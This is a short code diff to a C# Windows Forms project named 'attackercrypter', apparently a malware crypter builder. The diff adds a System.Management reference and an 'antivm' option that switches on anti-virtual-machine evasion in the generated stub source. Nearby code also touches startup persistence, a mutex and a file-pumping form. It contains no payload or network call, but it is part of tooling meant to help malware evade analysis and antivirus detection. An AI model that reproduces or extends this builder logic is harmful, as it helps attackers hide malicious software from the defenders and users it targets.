@@ -204,6 +204,7 @@ namespace attackercrypter
 
                 Params.ReferencedAssemblies.Add(typeof(System.Linq.Enumerable).Assembly.Location);
                 Params.ReferencedAssemblies.Add("System.Drawing.dll");
+                Params.ReferencedAssemblies.Add("System.Management.dll");
 
                 Source = Source.Replace("$MUTEX", mutex.Text);
                 
@@ -228,6 +229,12 @@ namespace attackercrypter
                 {
                     Source = Source.Replace("public static bool istartup = false;", "public static bool istartup = true;");
 
+
+                }
+                if (vm.Checked)
+                {
+
+                    Source = Source.Replace("public static bool antivm = false;", "public static bool antivm = true;");
 
                 }
                 else if (checkBox2.Checked && radioButton2.Checked)
@@ -657,6 +664,11 @@ namespace attackercrypter
         private void pump_Click(object sender, EventArgs e)
         {
             pumpform.Show();
+        }
+
+        private void label10_Click(object sender, EventArgs e)
+        {
+
         }
     }
     }
